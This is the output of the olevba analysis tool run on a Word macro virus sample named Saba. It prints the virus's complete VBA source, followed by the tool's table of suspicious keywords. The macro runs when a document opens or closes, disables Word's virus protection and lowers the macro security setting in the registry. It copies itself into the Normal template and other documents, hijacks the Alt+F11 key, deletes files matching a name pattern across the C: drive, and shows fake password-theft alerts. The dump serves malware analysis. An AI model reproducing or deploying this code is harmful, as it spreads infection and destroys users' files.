olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Saba-b9306cdec69089df3af025567e8cec4fd20873ce
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Saba-b9306cdec69089df3af025567e8cec4fd20873ce - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sabath.bas 
in file: Virus.MSWord.Saba-b9306cdec69089df3af025567e8cec4fd20873ce - OLE stream: 'Macros/VBA/sabath'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'SABatH means S.tealth A.rtificial Bat.tle...
'Sabath? ñîáñòâåííî óæå çäåñü!
'Sabath in each txt file...soon!!!
'Sabath is searching for you
'Harmless Sabath macro virii
'SABATH Ver 4.1 or later
'Mafia together again !!!
'Trying to be closer with SABATHy?
'Sabath is only the end of the begining
'Any suggestions? Send them to AVP.ru
'Ñåññèÿ - âðàã ñòóäåíòà!!!
'Áîëüøå ìàêðîñîâ îïàñíûõ è ðàçíûõ!
'Äëÿ óäàëåíèÿ ýòîãî ìàêðîñà íóæíî ïåðåçàãðóçèòü êîìïüþòåð ïðÿìî ñåé÷àñ!!!
'Ïðèâåò îò çëîáíîãî õàêåðà, âîîáùå-òî ýòî íàäîëãî...




Sub AboutVirii()
'MicrosoftSafetyMacros
'ver.4.14
'antiToolBarOn function added
'finished at 15:40 (15 May 2001)

End Sub


Sub ViewVBCode()
  On Error Resume Next
   Call antitoolbar
   Call sabath
   
End Sub
Sub sabath()
    
    
On Error Resume Next

Options.ConfirmConversions = False
Options.VirusProtection = False
VirusProtection = False
aSec = "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
System.PrivateProfileString(FileName:="", Section:=aSec, Key:="Level") = "1"

Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("sabath").Export "c:\sabath.drv"
ActiveDocument.ReadOnlyRecommended = False
NormalTemplate.VBProject.VBComponents("sabath").Export "c:\sabath.drv"
chislo = Int(Rnd * 100)

    If chislo = 99 Then MsgBox "Ïðèâåò VicodinES îò _\` /4 |3 /4 + |-|", vbSystemModal



If NormalTemplate.VBProject.VBComponents.Item("sabath").Name <> "sabath" Then TemplateNameCheck = True
If ActiveDocument.VBProject.VBComponents.Item("sabath").Name <> "sabath" Then ActiveDocNameCheck = True
If TemplateNameCheck = True And ActiveDocNameCheck = False Then Set VIRIIconst = NormalTemplate.VBProject.VBComponents
If TemplateNameCheck = False And ActiveDocNameCheck = True Then Set VIRIIconst = ActiveDocument.VBProject.VBComponents
VIRIIconst.import "c:\sabath.drv"
If ActiveDocNameCheck = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If ActiveDocNameCheck = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
Rem MsgBox "   _\` /4 |3 /4 + |-| tribute to VicodinES "
IDontKnowWhatItWas:
End Sub
Sub xHelpAbout()
   On Error Resume Next

  MsgBox " _\` /4 |3 /4 + |-|  ", vbInformation

 Call sabath
 End Sub

Sub AutoOpen()
    On Error Resume Next
    VirusProtection = False
aSec = "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
System.PrivateProfileString(FileName:="", Section:=aSec, Key:="Level") = "1"
    
ShowVisualBasicEditor = False
   KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=wdKeyCategoryCommand, Command:="FileClose"
    Call sabath

End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call sabath
End Sub


Sub Tooday()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = " îí "
            .Replacement.Text = " _\` /4 |3 /4 + |-| "
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = False
            .MatchAllWordForms = True
        End With
        

        Selection.Find.Execute Replace:=wdReplaceAll
      
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Sub FileTemplates()
    On Error Resume Next
    Call sabath
End Sub
Sub autoclose()
On Error Resume Next
VirusProtection = False
Call sabath
aSec = "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
System.PrivateProfileString(FileName:="", Section:=aSec, Key:="Level") = "1"
If Day(Now()) = Month(Now()) Then
MsgBox "Fatal Error #303. Passwords were stolen some days ago by dangerous hacker! Have a nice internet!", vbSystemModal
Else
End If
If Day(Now()) > 30 Then
Call ShowMess
Else
End If
ActiveDocument.Save
Kill "c:\sabath.drv"
StatusBar = "Get Ur NEW AVir TODAY!!! _\` A |3 A T |-|"

End Sub
Rem  Thanx to VicodinES, CyberShadow[SMF], Spooky, STEALTH group, GVG (Generic Virus Group)[still not member]
Rem  CodeBreakers, AVP-encyclopedia (very interesting and amazing reading)
Rem  comming soon SABATH site (not www.sabath.fbi.org)
Rem Lookin for ???.vxd everywere on Ur PC (in Ver 05)
Rem getting Name & sys-info and loging it for...(in Ver 05.2)
Rem  mp3 song inside... (in Ver 5.?m )
Rem findMeOut-algorithm hiding macro different ways (in Ver 06)
Rem no Few patches will be avaible on SaBat#.#####.ru

Private Sub ShowMess()
On Error Resume Next
If Left(Application.Version, 1) = "8" Then
  ShVer8
Else
End If
End Sub
Private Sub ShVer8()
 On Error Resume Next
 Assistant.Visible = True
 Dim bln As Balloon
 Set bln = Assistant.NewBalloon
 With bln
  .Mode = msoModeAutoDown
  .Heading = GetMess
  .Animation = Int(Rnd * (117))
  .Button = msoButtonSetNextClose
  
End Sub

Private Function GetMess()
On Error Resume Next
GetMess = Mid(ActiveDocument.VBProject.VBComponents.Item("sabath").CodeModule.Lines(Int(Rnd * ActiveDocument.VBProject.VBComponents.Item("sabath").CodeModule.CountOfDeclarationLines) + 1, 1), 2)
End Function

Sub antitoolbar()
'after my toolbarOn get popularized...
'...every target get it!!! Itz waz pitty!
' And I decide to "Fix thiz Bug"... right now! May,10 - 2001 year
'(no parts taken from MacroFAQ by CyberShadow)
On Error Resume Next

Application.DisplayAlerts = wdAlertsNone
'Íèêàêèõ îøèáîê íå ïîêàçûâàåò!!!
Options.VirusProtection = False
'Âûêëþ÷àåò çàùèòó îò âèðóñîâ è çàïóñê àâòî-ôóíêöèé.
Set fs = Application.FileSearch
With fs
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "toolbaron*.doc"
    If .Execute() > 0 Then
    
    For i = 1 To .FoundFiles.Count
        FileName$ = .FoundFiles(i)
        Kill FileName$
Next i
End If
End With

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

